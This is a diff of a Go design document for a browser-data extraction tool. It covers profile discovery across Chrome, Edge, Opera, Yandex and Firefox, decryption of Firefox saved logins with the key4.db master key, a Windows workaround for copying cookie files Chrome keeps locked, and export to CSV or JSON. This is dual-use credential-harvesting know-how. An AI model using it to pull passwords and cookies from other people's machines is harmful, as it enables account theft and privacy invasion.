@@ -3,7 +3,7 @@
 **Author**: moonD4rk
 **Status**: Proposed
 **Created**: 2026-03-14
-**Updated**: 2026-03-16
+**Updated**: 2026-03-22
 
 ## Abstract
 
@@ -13,7 +13,7 @@ This RFC covers the implementation details of data extraction and file acquisiti
 2. **File acquisition**: Session-based temp file management with deduplication
 3. **Extract methods**: concrete implementations for each data category
 4. **Shared helpers**: `QuerySQLite()` and `DecryptChromiumValue()`
-5. **Output**: writing `BrowserData` to CSV/JSON files
+5. **Output**: writing `Extract` results to CSV/JSON files
 
 **Constraint**: Go 1.20 (Windows 7 support).
 
@@ -29,10 +29,10 @@ CLI: main.go
     ▼
 browser.PickBrowsers("all", "")
     │
-    │  platformBrowsers() → []BrowserConfig
+    │  platformBrowsers() → []Config
     │  → chromium.New(cfg, dir) / firefox.New(dir)
     ▼
-Browser.BrowsingData(categories)
+Browser.Extract(categories)
     │
     ├─ filemanager.NewSession()
     │   └─ acquireFiles() with dedup → map[Category]tempPath
@@ -142,22 +142,150 @@ func (c *Chromium) acquireFiles(session *filemanager.Session, categories []types
 
 ### 2.3 Firefox key4.db: infrastructure, not a Category
 
+Each Firefox profile has its own `key4.db`. The master key is derived once in `New()` and stored on the struct, so `Extract()` never re-derives it:
+
 ```go
-func (f *Firefox) BrowsingData(categories []types.Category) (*browserdata.BrowserData, error) {
+// firefox.New() — called once per profile
+func New(profileDir string) (*Firefox, error) {
+    // derive master key from this profile's key4.db
+    keyPath := filepath.Join(profileDir, "key4.db")
+    masterKey, err := deriveMasterKey(keyPath)
+    if err != nil { return nil, err }
+
+    return &Firefox{
+        profileDir: profileDir,
+        masterKey:  masterKey,
+        sources:    firefoxSources,
+    }, nil
+}
+
+func (f *Firefox) Extract(categories []types.Category) (*browserdata.BrowserData, error) {
     session, _ := filemanager.NewSession()
     defer session.Cleanup()
 
     files := f.acquireFiles(session, categories)
 
-    // key4.db is infrastructure — acquired separately
-    keyPath := filepath.Join(session.TempDir(), "key4.db")
-    session.Acquire(filepath.Join(f.profileDir, "key4.db"), keyPath, false)
-    masterKey, err := f.deriveMasterKey(keyPath)
-    if err != nil { return nil, err }
-
-    // ... extract each category (see Section 4)
+    // masterKey was derived in New() from this profile's key4.db
+    data := &browserdata.BrowserData{}
+    // ... extract each category using f.masterKey ...
 }
 ```
+
+### 2.4 Profile Discovery
+
+Profile discovery functions are pure helpers (no struct receiver) that scan the filesystem:
+
+```go
+// profile/finder.go
+
+// discoverProfiles returns sub-directory names that look like Chrome profiles.
+// Matches "Default" or any name starting with "Profile ".
+// Falls back to ["."] for Opera-style layouts (data files live directly in userDataDir).
+func discoverProfiles(userDataDir string) []string {
+    entries, err := os.ReadDir(userDataDir)
+    if err != nil { return []string{"."} }
+
+    var profiles []string
+    for _, e := range entries {
+        if !e.IsDir() { continue }
+        name := e.Name()
+        if name == "Default" || strings.HasPrefix(name, "Profile ") {
+            profiles = append(profiles, name)
+        }
+    }
+    if len(profiles) == 0 {
+        return []string{"."}
+    }
+    return profiles
+}
+
+// discoverDataFiles checks which categories have actual data files in profileDir.
+func discoverDataFiles(profileDir string, sources map[types.Category]source) map[types.Category]string {
+    found := make(map[types.Category]string)
+    for cat, src := range sources {
+        for _, rel := range src.paths {
+            abs := filepath.Join(profileDir, rel)
+            info, err := os.Stat(abs)
+            if err != nil { continue }
+            if src.isDir && !info.IsDir() { continue }
+            if !src.isDir && info.IsDir() { continue }
+            found[cat] = abs
+            break
+        }
+    }
+    return found
+}
+
+// isValidBrowserDir checks whether the directory belongs to a real browser install.
+// Chromium: requires "Local State" file. Firefox: requires directory existence.
+func isValidBrowserDir(dir string, kind BrowserKind) bool {
+    switch kind {
+    case KindChromium, KindChromiumYandex:
+        _, err := os.Stat(filepath.Join(dir, "Local State"))
+        return err == nil
+    case KindFirefox:
+        info, err := os.Stat(dir)
+        return err == nil && info.IsDir()
+    }
+    return false
+}
+```
+
+**Testing approach**: all three functions are pure filesystem operations, easily testable with `t.TempDir()`:
+
+```go
+func TestDiscoverProfiles(t *testing.T) {
+    dir := t.TempDir()
+    os.MkdirAll(filepath.Join(dir, "Default"), 0o755)
+    os.MkdirAll(filepath.Join(dir, "Profile 1"), 0o755)
+    os.MkdirAll(filepath.Join(dir, "System Profile"), 0o755)
+
+    profiles := discoverProfiles(dir)
+    assert.Equal(t, []string{"Default", "Profile 1"}, profiles)
+}
+
+func TestDiscoverDataFiles(t *testing.T) {
+    dir := t.TempDir()
+    os.WriteFile(filepath.Join(dir, "Login Data"), []byte{}, 0o644)
+    os.MkdirAll(filepath.Join(dir, "Network"), 0o755)
+    os.WriteFile(filepath.Join(dir, "Network", "Cookies"), []byte{}, 0o644)
+
+    files := discoverDataFiles(dir, chromiumSources)
+    assert.Contains(t, files, types.Password)
+    assert.Contains(t, files, types.Cookie)
+}
+
+func TestAcquireFiles_Dedup(t *testing.T) {
+    dir := t.TempDir()
+    os.WriteFile(filepath.Join(dir, "History"), []byte("data"), 0o644)
+
+    session, _ := filemanager.NewSession()
+    defer session.Cleanup()
+
+    c := &Chromium{profileDir: dir, sources: chromiumSources}
+    files := c.acquireFiles(session, []types.Category{types.History, types.Download})
+    assert.Equal(t, files[types.History], files[types.Download])
+}
+```
+
+### 2.5 Platform Config Example
+
+Each platform file returns the full list of known browsers with their `UserDataDir` paths:
+
+```go
+// browser/browser_windows.go
+func platformBrowsers() []Config {
+    return []Config{
+        {Key: "chrome",   Name: "Chrome",        Kind: KindChromium, UserDataDir: homeDir + "/AppData/Local/Google/Chrome/User Data"},
+        {Key: "edge",     Name: "Microsoft Edge", Kind: KindChromium, UserDataDir: homeDir + "/AppData/Local/Microsoft/Edge/User Data"},
+        {Key: "opera",    Name: "Opera",          Kind: KindChromium, UserDataDir: homeDir + "/AppData/Roaming/Opera Software/Opera Stable"},
+        {Key: "yandex",   Name: "Yandex",         Kind: KindChromiumYandex, UserDataDir: homeDir + "/AppData/Local/Yandex/YandexBrowser/User Data"},
+        {Key: "firefox",  Name: "Firefox",        Kind: KindFirefox,  UserDataDir: homeDir + "/AppData/Roaming/Mozilla/Firefox/Profiles"},
+    }
+}
+```
+
+`PickBrowsers()` iterates this list, calls `isValidBrowserDir()` to skip browsers that aren't installed, then calls `discoverProfiles()` to find all profiles within valid browser directories.
 
 ---
 
@@ -313,25 +441,40 @@ func (c *Chromium) extractCookies(masterKey []byte, path string) ([]types.Cookie
 }
 ```
 
-### 4.3 Firefox password (JSON + ASN1PBE decryption)
+### 4.3 Firefox password (JSON + `decryptPBE()` helper)
+
+Firefox uses `decryptPBE()` to combine the 3-step pipeline (base64 decode -> ASN1 PBE parse -> decrypt) into one call, reducing 6 error checks to 2.
 
 ```go
 // browser/firefox/extract_password.go
+
+// decryptPBE combines base64 decode + ASN1 PBE parse + decrypt.
+func decryptPBE(encoded string, masterKey []byte) ([]byte, error) {
+    raw, err := base64.StdEncoding.DecodeString(encoded)
+    if err != nil { return nil, fmt.Errorf("base64 decode: %w", err) }
+    pbe, err := crypto.NewASN1PBE(raw)
+    if err != nil { return nil, fmt.Errorf("parse asn1 pbe: %w", err) }
+    plaintext, err := pbe.Decrypt(masterKey)
+    if err != nil { return nil, fmt.Errorf("decrypt: %w", err) }
+    return plaintext, nil
+}
 
 func (f *Firefox) extractPasswords(masterKey []byte, path string) ([]types.LoginEntry, error) {
     data, err := os.ReadFile(path)
     if err != nil { return nil, err }
 
     var logins []types.LoginEntry
-    loginsJSON := gjson.GetBytes(data, "logins")
-    for _, v := range loginsJSON.Array() {
-        encUser, _ := base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
-        encPass, _ := base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
-
-        userPBE, _ := crypto.NewASN1PBE(encUser)
-        pwdPBE, _ := crypto.NewASN1PBE(encPass)
-        user, _ := userPBE.Decrypt(masterKey)
-        pwd, _ := pwdPBE.Decrypt(masterKey)
+    for _, v := range gjson.GetBytes(data, "logins").Array() {
+        user, err := decryptPBE(v.Get("encryptedUsername").String(), masterKey)
+        if err != nil {
+            log.Debugf("decrypt username: %v", err)
+            continue
+        }
+        pwd, err := decryptPBE(v.Get("encryptedPassword").String(), masterKey)
+        if err != nil {
+            log.Debugf("decrypt password: %v", err)
+            continue
+        }
 
         url := v.Get("formSubmitURL").String()
         if url == "" { url = v.Get("hostname").String() }
@@ -458,6 +601,20 @@ func parseStorageKey(key []byte, separator []byte) (url, name string) {
 | key4.db | Not used | Required for master key derivation |
 | masterKey parameter | Passed to password, cookie, creditcard | Passed to password only |
 
+### 4.7 Error handling in extract methods
+
+Three-level rule:
+
+| Level | Action | Example |
+|-------|--------|---------|
+| File/DB open failure | `return nil, err` | `os.ReadFile` fails, `sql.Open` fails |
+| Single record failure | `log.Debugf` + `continue` | One password decryption failed |
+| Entire Category failure | Collected into `errs` by caller | Cookie file locked |
+
+Extract methods only `return error` for file-level failures. Record-level failures are logged at Debug level and skipped. The caller (`Extract()`) collects per-category errors with `errors.Join`.
+
+Error wrapping uses `fmt.Errorf("context: %w", err)` — no custom error types.
+
 ---
 
 ## 5. File Acquisition Layer
@@ -483,7 +640,14 @@ func (s *Session) Acquire(src, dst string, isDir bool) error {
     if isDir {
         return fileutil.CopyDir(src, dst, "lock")
     }
-    if err := fileutil.CopyFile(src, dst); err != nil { return err }
+    // Try normal copy first
+    err := fileutil.CopyFile(src, dst)
+    if err != nil {
+        // Normal copy failed (file may be locked), try platform-specific method
+        if err2 := copyLocked(src, dst); err2 != nil {
+            return fmt.Errorf("copy %s: %w; locked copy: %v", src, err, err2)
+        }
+    }
     // Copy SQLite WAL/SHM companion files if present
     for _, suffix := range []string{"-wal", "-shm"} {
         if fileutil.IsFileExists(src + suffix) {
@@ -498,7 +662,17 @@ func (s *Session) Cleanup() {
 }
 ```
 
-### 5.2 Acquirer interface (deferred)
+### 5.2 Locked file handling (Windows)
+
+On Windows, Chrome locks Cookie files while running. `Session.Acquire()` falls back to `copyLocked()` which uses `syscall.CreateFile` with `FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE` flags to bypass exclusive locks.
+
+Platform-specific files:
+- `filemanager/copy_windows.go` — `copyLocked()` with sharing flags
+- `filemanager/copy_other.go` — stub returning error
+
+This is transparent to callers — browser extract methods never know whether a file was copied normally or via the locked-file path.
+
+### 5.3 Acquirer interface (deferred)
 
 If only `CopyAcquirer` is needed, `Session.Acquire()` handles it directly. The `Acquirer` interface can be introduced later when VSS or other strategies are needed.
 
@@ -526,24 +700,55 @@ func (d *BrowserData) Output(dir, browserName, format string) error {
         {"sessionstorage", d.SessionStorage, len(d.SessionStorage)},
     }
 
-    out := newOutPutter(format)
     var errs []error
     for _, item := range items {
         if item.len == 0 { continue }
-
-        filename := fileutil.Filename(browserName, item.name, out.Ext())
-        f, err := out.CreateFile(dir, filename)
-        if err != nil {
-            errs = append(errs, fmt.Errorf("create %s: %w", filename, err))
+        filename := formatFilename(browserName, item.name, format)
+        if err := writeFile(dir, filename, format, item.data); err != nil {
+            errs = append(errs, fmt.Errorf("write %s: %w", filename, err))
             continue
         }
-        if err := out.Write(item.data, f); err != nil {
-            errs = append(errs, fmt.Errorf("write %s: %w", filename, err))
-        }
-        f.Close()
         log.Infof("exported: %s (%d items)", filename, item.len)
     }
     return errors.Join(errs...)
+}
+
+func writeFile(dir, filename, format string, data interface{}) error {
+    if dir != "" {
+        if err := os.MkdirAll(dir, 0o750); err != nil { return err }
+    }
+    path := filepath.Join(dir, filename)
+    f, err := os.OpenFile(path, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0o600)
+    if err != nil { return err }
+    defer f.Close()
+
+    switch format {
+    case "json":
+        return writeJSON(f, data)
+    default:
+        return writeCSV(f, data)
+    }
+}
+
+func writeJSON(w io.Writer, data interface{}) error {
+    enc := json.NewEncoder(w)
+    enc.SetIndent("", "  ")
+    enc.SetEscapeHTML(false)
+    return enc.Encode(data)
+}
+
+func writeCSV(w io.Writer, data interface{}) error {
+    // UTF-8 BOM (3 bytes) — replaces golang.org/x/text dependency
+    w.Write([]byte{0xEF, 0xBB, 0xBF})
+    csvWriter := csv.NewWriter(w)
+    return gocsv.MarshalCSV(data, gocsv.NewSafeCSVWriter(csvWriter))
+}
+
+func formatFilename(browserName, dataName, format string) string {
+    r := strings.NewReplacer(" ", "_", ".", "_", "-", "_")
+    ext := "csv"
+    if format == "json" { ext = "json" }
+    return strings.ToLower(fmt.Sprintf("%s_%s.%s", r.Replace(browserName), dataName, ext))
 }
 ```
 
@@ -585,9 +790,9 @@ func (d *BrowserData) Output(dir, browserName, format string) error {
 
 ### Phase 3: Wiring (modify existing files)
 
-1. Update `Chromium.BrowsingData()` to use new extract methods
-2. Update `Firefox.BrowsingData()` to use new extract methods
-3. Update `BrowserConfig` and `PickBrowsers()`
+1. Update `Chromium.Extract()` to use new extract methods
+2. Update `Firefox.Extract()` to use new extract methods
+3. Update `Config` and `PickBrowsers()`
 4. Update `browserdata/output.go`
 5. Update CLI `main.go`
 
